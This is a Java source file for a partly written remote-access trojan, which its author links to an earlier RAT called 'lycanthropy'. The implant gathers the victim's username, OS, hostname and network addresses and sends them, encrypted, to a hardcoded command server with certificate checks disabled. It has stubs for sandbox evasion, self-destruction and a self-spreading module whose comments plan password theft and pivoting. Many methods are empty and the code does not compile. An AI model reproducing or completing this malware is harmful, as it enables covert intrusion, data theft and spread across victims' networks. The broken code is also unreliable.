import java.io.BufferedReader;
import java.io.FileReader;
import java.io.StringWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;

import java.lang.reflect.Array;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.UUID;
import java.util.Arrays;
import java.util.Base64;
//import java.util.UUID;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.*;
import javax.xml.transform.stream.StreamResult;
import java.net.UnknownHostException;
import java.security.InvalidAlgorithmParameterException;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.lang.model.type.DeclaredType;
import javax.crypto.IllegalBlockSizeException;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import javax.swing.text.html.HTMLEditorKit.Parser;

import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URL;
import java.net.URI;
import java.net.URISyntaxException;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.security.spec.AlgorithmParameterSpec;
import java.text.DecimalFormat;
import java.security.InvalidKeyException;


class nConfig
{
    public static int locTcpPort = 49602;
    public static String encKey = "";
    public static int metastasize = 0;
    public static String uri = "https://wideking.git-monitor.com";
    public static int isKeystone = 0;
    public static int stutterMin = 10;
    public static int stutterMax = 50;
    public static String passMat = "T__+Pmv.REW=u9iXBB-";
    public static Hashtable endpoints = new Hashtable(){
        {
            put("auth","0000");
            put("upload","0001");
            put("download","0010");
        }
    };
}

public class nCore
{
    static public String cookieData = "null";
    static public String sessUUID = "";
    static public String nonce = "";

    public static void Main(String[] args)
    {
        sessUUID = UUID.randomUUID().toString();
        //convert to threadable once main loop has been tested

        //check if the program can reach out and if it's in a sandbox
        countermeasures cm = new countermeasures();

        if (!keepalive() || cm.chkSandbox())
        {
            cm.spoliate();
        }


        modLib.getUpdate();

        //execute initial 
        //start loop
        react("metadata");
    }

    public static boolean keepalive()
    {
        //5 tries to checkin
        network nComm = new network();
        for (int c=0; c<5; c++)
        try
        {
            nComm.request(nComm.mkAuth(),"auth");
        }
        catch
        {

        }

    }

    public static void react(String methodName)
    {
        //exec method, uses threader, loops to keepalive
        // 1. recv cmd
        // 2. modsearch
        // 3. thread mod if extant
        // 4. attempt to pull if not
    }

    public static void threader()
    {

    }

    //need class getter

    static class modLib
    {
        public static void getUpdate()
        {

        }

        public class autoLib
        {
            private void metastasize()
            {
                utilitarian nUtil = new utilitarian();
                
                ArrayList<Method> methList = nUtil.getClassMethods("modLib.autoLib.cancer");
                for (int a=0; a<methList.size(); a++)
                {
                    //need to put the code to thread in here
                    threader();
                }
                // spreader governor module, searches the autolib inner class cancer for any modules other than itself and runs them
            }

            class cancer
            {
                //currently empty, populated when modules updated
                //figure out how to get onto palos, grab passwords, add exceptions, and pivot
                //figure out rmi/ndwp?? jmx??
            }
        }

        private class genLib
        {
            private Document metadata() throws SocketException, UnknownHostException, ParserConfigurationException
            {
                Hashtable<String,String> metadata = new Hashtable<>();
                utilitarian nUtil = new utilitarian();

                metadata.put("arch",System.getProperty("os.arch"));
                metadata.put("os",System.getProperty("os.name"));
                metadata.put("version",System.getProperty("os.version"));
                metadata.put("user",System.getProperty("user.name"));
                metadata.put("cwd",System.getProperty("user.dir"));
                metadata.put("jre",System.getProperty("java.runtime.version"));
                metadata.put("interfaces",nUtil.getAddress().toString());
                metadata.put("hostname",nUtil.getHostname());
                metadata.put("uuid",sessUUID);

                return nUtil.outputToXmlDoc("metadata",metadata);
            }
        }

        private class nixLib
        {
            //currently empty, populated when modules updated
        }

        private class winLib
        {
            //currently empty, populated when modules updated
        }


    } 

    private static class utilitarian
    {

        private Method getMethodByName(String methodName)
        {
            
        }

        private Class getClassByName(String className)
        {

        }

        private ArrayList<Method> getClassMethods(String className)
        {

        }

        private Hashtable xmlStringToParseable(String input) throws ParserConfigurationException, IOException, SAXException
        {
            //responses should adhere to pattern:
            //<response><nonce data=""></nonce><cookie data=""></cookie><blob>b64</blob></response>
            Hashtable xmlData = new Hashtable();

            DocumentBuilderFactory manufactorum = DocumentBuilderFactory.newInstance();
            DocumentBuilder constructor = manufactorum.newDocumentBuilder();
            Document doc = constructor.parse(input);

            Element rootElement = doc.getDocumentElement();

            NodeList nl = rootElement.getChildNodes();
            for (int n=0;n<nl.getLength();n++)
            {
                Node nodeData = nl.item(n);
                if (nodeData.getNodeType() == Node.ATTRIBUTE_NODE)
                {
                    Element nodeElement = (Element) nodeData;
                    xmlData.put(nodeElement.getTagName(),nodeElement.getAttribute("data"));
                }
                else if (nodeData.getNodeName() == "blob")
                {
                    Element nodeElement = (Element) nodeData;
                    xmlData.put("blob",nodeElement.getTextContent());
                }
            }
            return xmlData;
        }

        private String xmlDocToString(Document xmlDoc) throws TransformerException
        {
            TransformerFactory tFacInst = TransformerFactory.newInstance();
            Transformer tFac = tFacInst.newTransformer();
            StringWriter stWrite = new StringWriter();
            tFac.transform(new DOMSource(xmlDoc), new StreamResult(stWrite));
            return stWrite.toString();
        }

        private Document outputToXmlDoc(String rootName, Hashtable<String,String> output) throws ParserConfigurationException
        {
            DocumentBuilderFactory manufactorum = DocumentBuilderFactory.newInstance();
            DocumentBuilder constructor = manufactorum.newDocumentBuilder();

            Document doc = constructor.newDocument();

            Element root = doc.createElement(rootName);
            doc.appendChild(root);
        
            Enumeration<String> k = output.keys();

            while (k.hasMoreElements())
            {
                String key = k.nextElement();
                Element kElement = doc.createElement(key.toString());
                kElement.setAttribute(
                    "data",
                    output.get(key.toString())
                );
                root.appendChild(kElement);
            }

            return doc;
        }

        //copied from my old RAT project, lycanthropy
        private String getHostname() throws UnknownHostException {
            String deviceName = new String();
                try {
                    InetAddress ipAddress = InetAddress.getLocalHost();
                    deviceName = ipAddress.getHostName();
                } catch (Exception e) {
                    String envVar = new String();
                    try {
                        if (System.getProperty("os.name").contains("Win")) {
                            deviceName = System.getenv("COMPUTERNAME");
                        } else {
                            StringBuilder fileString = new StringBuilder();
                            BufferedReader fileReader = new BufferedReader(new FileReader("/proc/sys/kernel/hostname"));
                            String nextLine = fileReader.readLine();
                            while (nextLine != null) {
                                fileString.append(nextLine);
                                nextLine = fileReader.readLine();
                            }
                            deviceName = fileString.toString();
                        }
                    } catch (Exception f) {
                        deviceName = "na";
                    }
                }
                return deviceName;
        }
        
        //copied from my old RAT project, lycanthropy
        private Hashtable getAddress() throws SocketException {
            Hashtable interfaceMap = new Hashtable();
            Enumeration interfaces = NetworkInterface.getNetworkInterfaces();
            while(interfaces.hasMoreElements()) {
                ArrayList<String> addressList = new ArrayList<String>();
                NetworkInterface interfaceObject = (NetworkInterface) interfaces.nextElement();
                Enumeration addresses = interfaceObject.getInetAddresses();
                while(addresses.hasMoreElements()) {
                    InetAddress addressObject = (InetAddress) addresses.nextElement();
                    addressList.add(addressObject.getHostAddress());
                }
                interfaceMap.put(interfaceObject.getName(),addressList.toString());
            }
            return interfaceMap;
        }
    }

    private class network
    {
        private String mkAuth() throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
        {
            Hashtable<String,String> authData = new Hashtable<>();
            utilitarian nUtil = new utilitarian();
            security nSec = new security();
            
            byte[] passCrypt = nSec.encrypt(
                nConfig.passMat.getBytes(),
                nonce.getBytes()
            );

            authData.put("aKey",new String(Base64.getEncoder().encode(passCrypt)));

            return nUtil.xmlDocToString(nUtil.outputToXmlDoc("init",authData));

        }

        private String request(String postData, String endpointType) throws NoSuchAlgorithmException, KeyManagementException, IOException, URISyntaxException
        {
            //stackoverflow provided boilerplate
            security secInst = new security();
            utilitarian nUtil = new utilitarian();

            SSLContext sslCon = SSLContext.getInstance("TLS");
            sslCon.init(null, new TrustManager[] {new InvalidCertificateTrustManager()}, null);
            
            String fmtUri = String.format("%s%s",nConfig.uri,nConfig.endpoints.get(endpointType).toString());

            URL ctrlUrl = new URI(fmtUri).toURL();

            HttpsURLConnection connMan;
            try
            {
                connMan = (HttpsURLConnection) ctrlUrl.openConnection();

                connMan.setRequestMethod("POST");
                connMan.setDoOutput(true);
                connMan.setRequestProperty(
                    "__Secure-3PSIDCC",
                    new String(Base64.getEncoder().encode(cookieData.getBytes()))
                );

                connMan.setHostnameVerifier(new InvalidCertificateHostVerifier());

                OutputStreamWriter connOutWriter = new OutputStreamWriter(connMan.getOutputStream());
                
                connOutWriter.write(
                    new String(
                        Base64.getEncoder().encode(
                            secInst.encrypt(
                                postData.getBytes(), 
                                nonce.getBytes()
                            )
                        )
                    )
                );
                

                connOutWriter.close();

                if (connMan.getResponseCode() == HttpsURLConnection.HTTP_OK)
                {
                    byte[] decodedResponseData = secInst.decrypt(
                        Base64.getDecoder().decode(
                            connMan.getResponseMessage()
                        ),
                        nonce.getBytes()
                    );
                    return new String(decodedResponseData);
                }
                else
                {
                    return "null";
                }
            }
            catch (Exception e)
            {
                return "null";
            }
        }

        public class InvalidCertificateHostVerifier implements HostnameVerifier{
        @Override
        public boolean verify(String paramString, SSLSession paramSSLSession) {
            return true;
        }
}

        //stackoverflow: https://stackoverflow.com/questions/26393031/how-to-execute-a-https-get-request-from-java
        public class InvalidCertificateTrustManager implements X509TrustManager{
            @Override
            public X509Certificate[] getAcceptedIssuers() {
                return null;
            }

            @Override
            public void checkServerTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {

            }

            @Override
            public void checkClientTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {
            }
        }
    }

    private static class countermeasures
    {
        private boolean chkSandbox()
        {

        }

        private boolean spoliate()
        {

        }
    }

    private class security
    {
        //replicates my lycanthropy aesgcm
        private byte[] encrypt(byte[] plaintext, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
        {
            SecretKey key = initKey();
            Cipher cipher = initCipher();

            AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
            cipher.init(Cipher.ENCRYPT_MODE, key, ivParam);
            return cipher.doFinal(plaintext);
        }

        private byte[] decrypt(byte[] encrypted, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
        {
            SecretKey key = initKey();
            Cipher cipher = initCipher();

            AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
            cipher.init(Cipher.DECRYPT_MODE, key, ivParam);
            return cipher.doFinal(encrypted);
        }

        private Cipher initCipher() throws Exception
        {
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            return cipher;
        }

        private SecretKey initKey() throws Exception
        {
            byte[] keyBytes = Base64.getDecoder().decode(nConfig.encKey);
            SecretKey key = new SecretKeySpec(keyBytes, 0, keyBytes.length, "AES");
            return key;
        }
    }
}